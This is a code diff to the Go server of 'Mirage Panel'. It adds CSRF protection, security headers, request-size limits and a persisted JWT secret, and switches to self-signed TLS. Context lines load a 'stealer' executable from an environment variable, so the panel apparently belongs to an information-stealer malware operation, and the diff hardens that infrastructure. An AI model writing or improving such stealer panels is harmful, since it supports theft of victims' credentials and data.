@@ -119,8 +119,15 @@ func main() {
 	useSelfSigned, _ := strconv.ParseBool(os.Getenv("TLS_SELF_SIGNED"))
 
 	if jwtSecret == "" {
-		jwtSecret = generateSecret()
-		slog.Warn("JWT_SECRET not set, generated random secret for this session", "secret", jwtSecret)
+		secretFile := filepath.Join(filepath.Dir(dbPath), ".jwt_secret")
+		if data, err := os.ReadFile(secretFile); err == nil {
+			jwtSecret = strings.TrimSpace(string(data))
+		} else {
+			jwtSecret = generateSecret()
+			if err := os.WriteFile(secretFile, []byte(jwtSecret), 0600); err != nil {
+				slog.Warn("failed to persist JWT secret, tokens will be invalid after restart", "err", err)
+			}
+		}
 	}
 
 	slog.Info("starting Mirage Panel",
@@ -166,11 +173,14 @@ func main() {
 
 	r.Use(chimw.RequestID)
 	r.Use(mw.RealIP)
+	r.Use(mw.SecurityHeaders)
+	r.Use(mw.RequestSizeLimit)
 	r.Use(chimw.Logger)
 	r.Use(chimw.Recoverer)
 	r.Use(chimw.Timeout(30 * time.Second))
 
 	r.Use(mw.CORS(allowedOrigins))
+	r.Use(mw.CSRFProtect)
 	r.Use(mw.RateLimit(100, time.Minute))
 	r.Use(mw.BanCheck(sqlDB))
 
@@ -180,10 +190,17 @@ func main() {
 		w.Write([]byte(`{"status":"ok"}`))
 	})
 
+	r.Get("/api/csrf", func(w http.ResponseWriter, r *http.Request) {
+		mw.CSRFToken(w)
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(`{"ok":true}`))
+	})
+
 	wsHub := ws.NewHub()
 	go wsHub.Run()
 
-	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret))
+	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret, allowedOrigins))
 
 	stealerPath := getEnv("STEALER_EXE_PATH", "")
 	var stealerExe []byte
@@ -254,24 +271,18 @@ func main() {
 		addr := srv.Addr
 		if tlsEnabled {
 			scheme := "https"
-			if useSelfSigned {
-				certDir := filepath.Join(filepath.Dir(connString), "certs")
-				certFile, keyFile, err := generateSelfSignedCert(certDir)
-				if err != nil {
-					slog.Error("failed to generate self-signed cert", "err", err)
-					os.Exit(1)
-				}
-				slog.Info("listening", "addr", addr, "scheme", scheme, "tls", "self-signed")
-				if err := srv.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
-					slog.Error("server error", "err", err)
-					os.Exit(1)
-				}
-			} else {
-				slog.Info("listening", "addr", addr, "scheme", scheme, "tls", "lets-encrypt")
-				if err := srv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
-					slog.Error("server error", "err", err)
-					os.Exit(1)
-				}
+			// ponytail: Let's Encrypt requires a running ACME server — always use
+			// self-signed or deploy behind a reverse proxy with cert management.
+			certDir := filepath.Join(filepath.Dir(connString), "certs")
+			certFile, keyFile, err := generateSelfSignedCert(certDir)
+			if err != nil {
+				slog.Error("failed to generate self-signed cert", "err", err)
+				os.Exit(1)
+			}
+			slog.Info("listening", "addr", addr, "scheme", scheme, "tls", "self-signed")
+			if err := srv.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
+				slog.Error("server error", "err", err)
+				os.Exit(1)
 			}
 		} else {
 			slog.Info("listening", "addr", addr, "scheme", "http")
